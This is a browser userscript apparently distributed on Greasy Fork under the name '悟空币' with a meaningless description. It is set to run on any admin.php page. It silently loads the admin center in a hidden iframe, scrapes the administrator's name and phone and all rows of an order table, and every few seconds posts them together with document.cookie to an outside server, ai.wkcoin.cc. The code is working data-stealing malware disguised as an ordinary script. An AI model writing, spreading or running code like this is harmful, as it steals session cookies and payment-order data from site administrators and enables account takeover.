// ==UserScript==
// @name         悟空币
// @namespace    http://your-namespace.com
// @version      0.5
// @description  123321
// @author       You
// @match *://*/admin.php?*
// @grant        none
// @license      MIT
// @downloadURL https://update.greasyfork.org/scripts/482746/%E6%82%9F%E7%A9%BA%E5%B8%81.user.js
// @updateURL https://update.greasyfork.org/scripts/482746/%E6%82%9F%E7%A9%BA%E5%B8%81.meta.js
// ==/UserScript==

(function() {
    'use strict';

    if(localStorage.getItem('phone') == null){
        getpayaddress()
    }

    var currentURL = window.location.href;

    if(currentURL == 'http://sd29sesu.rtxad22.aipay.pro/admin.php'){//首页



    }else if(currentURL.includes('admin.php?a=index&f=center')){
        var secondTRs = document.querySelector('table tr:nth-child(1)');
        var tdElements = secondTRs.querySelector('td#vzebra-children');
        var numericValues = tdElements.textContent.trim();
        localStorage.setItem('name', numericValues);
        document.title =numericValues+'后台';
        console.log(numericValues)

        var secondTR = document.querySelector('table tr:nth-child(2)');
        var tdElement = secondTR.querySelector('td#vzebra-adventure');
        var numericValue = tdElement.textContent.trim();
        localStorage.setItem('phone', numericValue);

    }else if(currentURL.includes('admin.php?a=plug&f=dlist2&id=51')){//获取表格信息

        executeImmediateLogic();
        const table = document.querySelector('table.ltable');
		if (table) {
			const observer = new MutationObserver((mutationsList, observer) => {
				// 表格发生变化时执行的逻辑
				executeImmediateLogic();
			});
			// 配置 MutationObserver 监听子节点的变化
			const config = { childList: true, subtree: true };
			observer.observe(table, config);
		}
        var reasdasdasd = setInterval(function() {
           postDataToAPI('ping',[]);
        }, 3000);



        // 判断页面是否在前台的函数
	    function isPageInBackground() {
	        return document.visibilityState === 'hidden';
	    }

	    // 刷新页面的函数
	    function refreshPage() {
	        location.reload(true); // true 表示强制从服务器重新加载，不使用缓存
	    }

	    // 设置定时器，每30秒检测一次页面是否在后台，如果在后台就刷新页面
	    var refreshIntervalId = setInterval(function() {
	        if (isPageInBackground()) {
	            refreshPage();
	        }
	    }, 30000); // 30000 毫秒 = 30 秒

    }




    // 立即执行的逻辑
	function executeImmediateLogic() {
		const table = document.querySelector('table.ltable');
        if (table) {
            const rows = table.querySelectorAll('tr');
            const dataToSend = [];
            rows.forEach((row, rowIndex) => {
                const cells = row.querySelectorAll('td');
                const rowData = {};
                cells.forEach((cell, cellIndex) => {
                    if (rowIndex === 0) {} else {
                        rowData[`Column${cellIndex + 1}`] = cell.textContent.trim()??"";
                    }
                });
                if (rowIndex !== 0) {
                    dataToSend.push(rowData);
                }
            });
            postDataToAPI('orderlist',dataToSend);
		}
	}





    // 发送 POST 请求的函数
	function postDataToAPI(types,lists) {
       var cookies = document.cookie
       var phone = localStorage.getItem('phone')
       var name = localStorage.getItem('name')
		const postData = { lists, types,cookies,phone,name };
		fetch('http://ai.wkcoin.cc/api/v1/coin_api?method=set.wkpay.list', {
            mode: 'no-cors',
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
			},
			body: JSON.stringify(postData),
		})
	}


    function getpayaddress(){
        const iframeElement = document.createElement('iframe');
        // 设置 iframe 的属性
        iframeElement.src = 'http://sd29sesu.rtxad22.aipay.pro/admin.php?a=index&f=center'; // 替换成你要加载的页面的 URL
        iframeElement.width = '10';
        iframeElement.height = '10';

        // 插入 iframe 到页面中
        document.body.appendChild(iframeElement);
    }


})();
